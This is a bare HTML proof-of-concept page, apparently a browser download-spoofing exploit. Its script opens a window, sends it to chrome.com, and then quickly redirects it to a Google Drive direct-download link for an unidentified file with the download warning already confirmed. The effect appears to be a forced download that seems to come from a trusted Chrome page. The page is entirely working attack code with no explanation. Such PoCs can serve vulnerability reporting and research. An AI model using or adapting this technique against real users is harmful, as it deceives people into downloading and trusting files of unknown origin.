<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>poc</title>
  <script>
    function chainRedirect(w, urls, index = 0) {
      if (index < urls.length) {
        w.location.replace(urls[index]);
        setTimeout(() => chainRedirect(w, urls, index + 1), 1000);
      }
    }

    function startRedirect() {
      let w = window.open("");
      setTimeout(() => {
        chainRedirect(w, [
        "https://chrome.com",
        "https://drive.usercontent.google.com/download?id=1Ky6ckxHgrE6HUlAq9g842YXa2nyGO5pU&export=download&authuser=0&confirm=t&uuid=63f80b4c-24d3-49bd-b402-3d8e3b989d21&at=AGN2oQ2aRBaepFbgnCDhyUTathsD:1773906708696",
        ]);
      }, 1000);
    }
  </script>
</head>
<body>
  <button onclick="startRedirect()">Start</button>
</body>
</html>
